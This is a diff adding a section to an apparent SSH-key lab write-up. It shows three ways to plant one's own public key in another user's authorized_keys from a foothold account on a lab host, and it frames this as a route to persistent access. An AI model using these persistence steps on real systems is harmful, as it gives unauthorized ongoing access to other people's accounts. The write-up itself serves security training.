@@ -301,5 +301,96 @@ ssh john@localhost -o StrictHostKeyChecking=no "cat ~/hint.txt"
 
 ---
 
+## Alternative: Transfer Public Key from Local Machine
+
+Instead of generating the SSH key on the server, you can generate it on your local machine and transfer the public key. This is useful when you want to SSH directly as john from your own computer.
+
+### Method 1: Using SCP (Secure Copy)
+
+**Step 1:** Generate SSH key on your local machine (if you don't have one):
+
+```bash
+# On your local machine (Windows/Mac/Linux)
+ssh-keygen -t rsa -f ~/.ssh/id_rsa -N ""
+```
+
+**Step 2:** Copy the public key to the server via noob:
+
+```bash
+# Copy public key to noob's home directory first
+scp -P 2222 ~/.ssh/id_rsa.pub noob@10.10.61.221:/home/noob/my_key.pub
+```
+
+**Step 3:** SSH as noob and inject the key to john:
+
+```bash
+ssh noob@10.10.61.221 -p 2222
+cat ~/my_key.pub >> /home/john/.ssh/authorized_keys
+exit
+```
+
+**Step 4:** Now SSH directly as john from your local machine:
+
+```bash
+ssh john@10.10.61.221 -p 2222
+```
+
+---
+
+### Method 2: Copy-Paste via Terminal
+
+**Step 1:** Display your local public key:
+
+```bash
+# On your local machine
+cat ~/.ssh/id_rsa.pub
+```
+
+Copy the output (starts with `ssh-rsa AAAA...`).
+
+**Step 2:** SSH as noob and write the key:
+
+```bash
+ssh noob@10.10.61.221 -p 2222
+
+# Paste your public key into john's authorized_keys
+echo "ssh-rsa AAAA... your-key-here" >> /home/john/.ssh/authorized_keys
+```
+
+**Step 3:** Exit and SSH as john:
+
+```bash
+exit
+ssh john@10.10.61.221 -p 2222
+```
+
+---
+
+### Method 3: One-Line Remote Injection
+
+If you already have `~/.ssh/id_rsa.pub` on your local machine:
+
+```bash
+# From your local machine - inject key in one command
+cat ~/.ssh/id_rsa.pub | ssh -p 2222 noob@10.10.61.221 "cat >> /home/john/.ssh/authorized_keys"
+
+# Now SSH directly as john
+ssh john@10.10.61.221 -p 2222
+```
+
+---
+
+### Why Transfer from Local?
+
+| Approach | Pros | Cons |
+|----------|------|------|
+| Generate on server | Simple, no file transfer | Key stays on compromised server |
+| Transfer from local | Use your existing key, SSH directly as john | Extra step to transfer |
+
+For penetration testing, generating on the server is faster. For persistent access, using your local key is more convenient.
+
+---
+
 *Created: 2026-03-06*
+*Updated: 2026-03-07 (Added key transfer methods)*
 *Lab: SSH Key Authentication (Pre-Lab)*
